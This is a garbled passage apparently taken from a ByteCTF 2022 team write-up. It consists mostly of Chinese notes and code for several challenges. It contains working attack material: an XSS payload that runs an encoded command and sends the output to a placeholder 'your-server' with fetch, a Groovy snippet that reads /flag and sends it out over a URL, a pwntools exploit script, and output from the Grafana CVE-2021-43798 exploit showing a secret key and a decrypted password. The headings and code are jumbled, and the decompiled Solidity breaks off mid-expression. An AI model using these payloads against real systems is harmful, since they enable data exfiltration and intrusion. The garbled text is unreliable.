cmd=${cmd}").then(x=>x.text()).then(x=>fetch("http://your-
server?data="+x))` 
cmd = btoa(cmd) 
    url = "http://127.0.0.1:13002/?
name=%3Cimg%20src%3Dx%20onerror%3D'eval(atob(%22"+cmd+"%22))')%3
E" 
    const words = 
['web','bytedance','ctf','sing','jump','rap','basketball','hello
','world','fighting','flag','game','happy'] 
    i=0 
l=0 
iframe.onload = function(){ 
const w = iframe.contentWindow 
w.location.replace(url+"#"+words[i]); 
if(i==12){ 
i=0; 
if(l++ > 13){ 
fetch('/?done') 
iframe.onload = function(){} 
} 
}else{ 
i++; 
} 
} 
JS
CVE-2021-43798 
bypass 反代
魔改的控制流平坦化，把下面地址patch能稍微正常反编译
校验输入： sub_403EF0(char *a1)  
0-9，A-G，52 字符
方向数组：
easy_grafana
[*] grafanaIni_secretKey= SW2YcwTIb9zpO1hoPsMm 
[*] DataSourcePassword= 
b0NXeVJoSXKPoSYIWt8i/GfPreRT03fO6gbMhzkPefodqe1nvGpdSROTvfHK1I3k
zZy9SQnuVy9c3lVkvbyJcqRwNT6/ 
[*] plainText= ByteCTF{e292f461-285e-47fc-9210-b9cd233773cb} 
[*] grafanaIni_secretKey= SW2YcwTIb9zpO1hoPsMm 
[*] PlainText= jas502n 
[*] EncodePassword= T2pwUTkySm3x+iaVtLb4UbJZ5LX+VDy7wJiB/1tsvQ== 
SHELL
maze6d (CObf Ver.)
404036 call sub_403608 
[ 
0x00000001, 0x00000000,  
0x00000000, 0x00000001,  
0xFFFFFFFF, 0x00000000,  
C
另外一部分每个字节低6位，直接按顺序爆破就行。。。
没回显
groovy ban了很多函数。。
c。。用了openrasp
https://2019.pass-the-salt.org/les/slides/12-Hacking_Jenkins.pdf
0x00000000, 0xFFFFFFFF 
] 
bash_game
from pwn import * 
CHALLENGE_ID = 'a1aa3e111e8f007bfd4ad0c2c0504d26' 
p = remote(CHALLENGE_ID + '.2022.capturetheflag.fun', 1337, 
ssl=True) 
p.sendlineafter(b'score',b'score*=-10000') 
p.sendline(b'wasd'*100) 
p.interactive() 
PYTHON
easy_groovy
https://landgrey.me/blog/15/
def flag = new String(new File("/flag").readBytes()) 
def expurl = "http://xxx/?" + flag 
new URL(expurl).getText() 
PYTHON
signin
fetch("/api/signin", { 
            method: "POST", 
            body: JSON.stringify({ 
                team_name: "Nu1L Team", 
                team_id: 745 
            }), 
            headers: { 
                "content-type": "application/json" 
            } 
        }); //team id 从https://ctf.bytedance.com/api/team/info?
lang=zh-CN拿 
JS
OhMySolidity
contract Contract { 
    function main() { 
        memory[0x40:0x60] = 0x80; 
        var var0 = msg.value; 
        if (var0) { revert(memory[0x00:0x00]); } 
        if (msg.data.length > 0xe0; 
        if (var0 == 0x14edb54d) { 
            // Dispatch table entry for k1() 
            var var1 = 0x006f; 
            var var2 = k1(); 
            var temp0 = memory[0x40:0x60]; 
            memory[temp0:temp0 + 0x20] = var2 & 0xffffffff; 
            var temp1 = memory[0x40:0x60]; 
            return memory[temp1:temp1 + (temp0 + 0x20) - temp1]; 
        } else if (var0 == 0x58f5382e) { 
            // Dispatch table entry for challenge(string) 
            var1 = 0x014a; 
            var2 = 0x04; 
            var var3 = msg.data.length - var2; 
            if (var3 = var7) { 
            label_018A: 
                var temp5 = var6; 
                var4 = temp5 + var4; 
                var5 = temp5 & 0x1f; 
                if (!var5) { 
                    var temp6 = memory[0x40:0x60]; 
                    return memory[temp6:temp6 + var4 - temp6]; 
                } else { 
                    var temp7 = var5; 
                    var temp8 = var4 - temp7; 
                    memory[temp8:temp8 + 0x20] = ~(0x0100 ** 
(0x20 - temp7) - 0x01) & memory[temp8:temp8 + 0x20]; 
                    var temp9 = memory[0x40:0x60]; 
                    return memory[temp9:temp9 + (temp8 + 0x20) - 
temp9]; 
                } 
            } else { 
            label_0178: 
                var temp10 = var10; 
                memory[var8 + temp10:var8 + temp10 + 0x20] = 
memory[var9 + temp10:var9 + temp10 + 0x20]; 
                var10 = temp10 + 0x20; 
                if (var10 >= var7) { goto label_018A; } 
                else { goto label_0178; } 
            } 
        } else if (var0 == 0x93eed093) { 
            // Dispatch table entry for 0x93eed093 (unknown) 
            var1 = 0x01cd; 
            var2 = func_056F(); 
            var temp11 = memory[0x40:0x60]; 
            memory[temp11:temp11 + 0x20] = var2 & 0xffffffff; 
            var temp12 = memory[0x40:0x60]; 
            return memory[temp12:temp12 + (temp11 + 0x20) - 
temp12]; 
        } else if (var0 == 0x9577a145) { 
            // Dispatch table entry for 0x9577a145 (unknown) 
            var1 = 0x0251; 
            var2 = 0x04; 
            var3 = msg.data.length - var2; 
            if (var3  0x0100000000) { revert(memory[0x00:0x00]); } 
        var temp2 = arg1 + var1; 
        var1 = temp2; 
        if (var1 + 0x20 > arg0) { revert(memory[0x00:0x00]); } 
        var temp3 = var1; 
        var temp4 = msg.data[temp3:temp3 + 0x20]; 
        var1 = temp4; 
        var temp5 = var0; 
        var0 = temp3 + 0x20; 
        var var2 = temp5; 
        if ((var1 > 0x0100000000) | (var0 + var1 > arg0)) { 
revert(memory[0x00:0x00]); } 
        var temp6 = var1; 
        var temp7 = memory[0x40:0x60];
        memory[0x40:0x60] = temp7 + (temp6 + 0x1f) / 0x20 * 0x20 
+ 0x20; 
        memory[temp7:temp7 + 0x20] = temp6; 
        var temp8 = temp7 + 0x20; 
        memory[temp8:temp8 + temp6] = msg.data[var0:var0 + 
temp6]; 
        memory[temp8 + temp6:temp8 + temp6 + 0x20] = 0x00; 
        arg0 = temp7; 
        arg1 = 0x60; 
        var0 = arg0; 
        var1 = 0x00; 
        var2 = 0x08; 
        var var3 = memory[var0:var0 + 0x20]; 
        if (!var2) { assert(); } 
        if (var3 % var2 != var1) { revert(memory[0x00:0x00]); } 
        var1 = 0x60; 
        var temp9 = memory[var0:var0 + 0x20]; 
        var temp10 = memory[0x40:0x60]; 
        var3 = temp9; 
        var2 = temp10; 
        memory[var2:var2 + 0x20] = var3; 
        memory[0x40:0x60] = var2 + (var3 + 0x1f & ~0x1f) + 0x20; 
        if (!var3) { 
            var1 = var2; 
            var2 = 0xdeadbeef; 
            var3 = 0x00; 
            if (var3 >= memory[var0:var0 + 0x20]) { 
            label_0563: 
                return var1; 
            } else { 
            label_032D: 
                var var4 = 0x00; 
                var var5 = 0x00; 
                var var6 = 0x00; 
                var var7 = 0x00; 
                if (var7 & 0xff >= 0x04) { 
                label_03CD: 
                    var7 = 0x00; 
                    if (var7 & 0xff >= 0x20) { 
                    label_047F: 
                        var7 = 0x00; 
                        if (var7 & 0xff >= 0x04) { 
                        label_0554: 
                            var3 = var3 + 0x08; 
                            if (var3 >= memory[var0:var0 + 
0x20]) { goto label_0563; } 
                            else { goto label_032D; } 
                        } else { 
                        label_0493: 
                            var temp11 = var7; 
                            var var8 = (((var5 & 0xffffffff) >> 
(0x03 - temp11 * 0x08 & 0xff)) & 0xff) = memory[var9:var9 + 
0x20]) { assert(); } 
                            memory[var10 + 0x20 + var9:var10 + 
0x20 + var9 + 0x01] = byte(var8 & 
~0xfffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff
f, 0x00); 
                            var temp12 = var7; 
                            var8 = (((var6 & 0xffffffff) >> 
(0x03 - temp12 * 0x08 & 0xff)) & 0xff) = memory[var9:var9 + 
0x20]) { assert(); } 
                            memory[var10 + 0x20 + var9:var10 + 
0x20 + var9 + 0x01] = byte(var8 & 
~0xfffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff
f, 0x00); 
                            var7 = var7 + 0x01; 
                            if (var7 & 0xff >= 0x04) { goto 
label_0554; } 
                            else { goto label_0493; } 
                        } 
                    } else { 
                    label_03E1: 
                        var temp13 = var4 + var2; 
                        var4 = temp13; 
                        var temp14 = var6; 
                        var temp15 = var5 + (((temp14 & 
0xffffffff) << 0x04) + (storage[0x00] & 0xffffffff) ~ temp14 + 